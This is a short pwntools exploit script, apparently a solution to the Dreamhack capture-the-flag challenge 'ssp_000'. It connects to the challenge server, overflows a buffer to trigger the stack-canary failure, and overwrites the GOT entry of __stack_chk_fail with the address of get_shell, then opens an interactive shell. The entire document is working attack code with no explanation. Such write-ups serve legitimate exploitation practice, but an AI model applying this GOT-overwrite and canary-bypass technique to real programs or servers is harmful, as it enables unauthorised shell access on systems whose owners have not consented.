from pwn import *

p = remote('host3.dreamhack.games', 15838)
e = ELF('./ssp_000')

get_shell = e.symbols['get_shell']
chk_fail = e.got['__stack_chk_fail']
p.sendline(b'A' * 0x80)

p.sendlineafter(b'Addr : ', str(chk_fail))
p.sendlineafter(b'Value : ', str(get_shell))

p.interactive()